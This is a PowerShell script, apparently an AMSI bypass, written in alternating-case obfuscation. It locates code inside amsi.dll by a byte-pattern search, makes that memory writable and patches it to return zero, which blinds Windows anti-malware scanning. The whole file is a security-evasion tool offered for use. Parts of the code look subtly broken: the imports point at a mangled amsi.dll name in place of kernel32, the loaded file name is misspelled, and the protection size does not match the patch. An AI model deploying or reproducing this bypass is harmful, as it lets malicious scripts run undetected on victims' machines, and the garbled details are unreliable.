WrItE-hOsT "-- AMSI PaTcH"
WrItE-hOsT "-- PaUl LaîNé (@Am0nSeC)"
WrItE-hOsT ""

function ConvertTo-Hex {
    param (
        [string]$str
    )
    $hex = -join ($str.ToCharArray() | ForEach-Object { '{0:X2}' -f [int][char]$_ })
    return $hex
}

$amsiDllHex = ConvertTo-Hex -str "amsi.dll"
$amsiOpenSessionHex = ConvertTo-Hex -str "AmsiOpenSession"

$amsiDllVar = $amsiDllHex.ToLower() + $amsiDllHex.ToUpper()
$amsiOpenSessionVar = $amsiOpenSessionHex.ToLower() + $amsiOpenSessionHex.ToUpper()

$KeRnEl32 = @"
UsInG SyStEm;
UsInG SyStEm.RuNtImE.InTeRoPSeRvIcEs;

PuBlIc ClAsS KeRnEl32 {
    [DlLImPoRt("$amsiDllVar")]
    PuBlIc StAtIc ExTeRn InTpTr GeTPrOcAdDrEsS(InTpTr hMoDuLe, StRiNg lpPrOcNaMe);

    [DlLImPoRt("$amsiDllVar")]
    PuBlIc StAtIc ExTeRn InTpTr LoAdLiBrArY(StRiNg lpLiBFiLeNaMe);

    [DlLImPoRt("$amsiDllVar")]
    PuBlIc StAtIc ExTeRn BoOl ViRtUaLPrOtEcT(InTpTr lpAdDrEsS, UiNtPtR dWsiZe, uInT fLNeWPrOtEcT, OuT uInT lpFlOlDPrOtEcT);
}
"@

AdD-TyPe $KeRnEl32

ClAsS HuNtEr {
    StAtIc [InTpTr] FiNdAdDrEsS([InTpTr]$AdDrEsS, [ByTe[]]$EgG) {
        WhIlE ($TrUe) {
            [InT]$CoUnT = 0

            WhIlE ($TrUe) {
                [InTpTr]$AdDrEsS = [InTpTr]::AdD($AdDrEsS, 1)
                If ([SyStEm.RuNtImE.InTeRoPSeRvIcEs.MaRsHaL]::ReAdByTe($AdDrEsS) -Eq $EgG[$CoUnT]) {
                    $CoUnT++
                    If ($CoUnT -Eq $EgG.LeNgTh) {
                        ReTuRn [InTpTr]::SuBbTrAcT($AdDrEsS, $EgG.LeNgTh - 1)
                    }
                } Else { BrEaK }
            }
        }

        ReTuRn $AdDrEsS
    }
}

[InTpTr]$hMoDuLe = [KeRnEl32]::LoAdLiBrArY("aMsI.dLlL")
WrItE-hOsT "[+] AMSI dLlL HaNdLe: $hMoDuLe"

[InTpTr]$dLlLCaNUnLoAdNoWAdDrEsS = [KeRnEl32]::GeTPrOcAdDrEsS($hMoDuLe, "DlLCaNUnLoAdNoW")
WrItE-hOsT "[+] DllCaNUnLoAdNoW adDrEsS: $dLlLCaNUnLoAdNoWAdDrEsS"

If ([InTpTr]::SiZe -Eq 8) {
    WrItE-hOsT "[+] 64-BiTs PrOcEsS"
    [ByTe[]]$EgG = [ByTe[]] (0x4C, 0x8B, 0xDC)
} Else {
    WrItE-hOsT "[+] 32-BiTs PrOcEsS"
    [ByTe[]]$EgG = [ByTe[]] (0x8B, 0xFF)
}
[InTpTr]$TaRgEtAdDrEsS = [HuNtEr]::FiNdAdDrEsS($dLlLCaNUnLoAdNoWAdDrEsS, $EgG)
WrItE-hOsT "[+] TaRgEtEd AdDrEsS: $TaRgEtAdDrEsS"

$OlDPrOtEcTiOnBuFfEr = 0
[KeRnEl32]::ViRtUaLPrOtEcT($TaRgEtAdDrEsS, [UiNt32]2, 4, [ReF]$OlDPrOtEcTiOnBuFfEr) | OuT-NuLl

$PaTcH = [ByTe[]] (0x31, 0xC0, 0xC3)
[SyStEm.RuNtImE.InTeRoPSeRvIcEs.MaRsHaL]::CoPy($PaTcH, 0, $TaRgEtAdDrEsS, 3)

$a = 0
[KeRnEl32]::ViRtUaLPrOtEcT($TaRgEtAdDrEsS, [UiNt32]2, $OlDPrOtEcTiOnBuFfEr, [ReF]$a) | OuT-NuLl
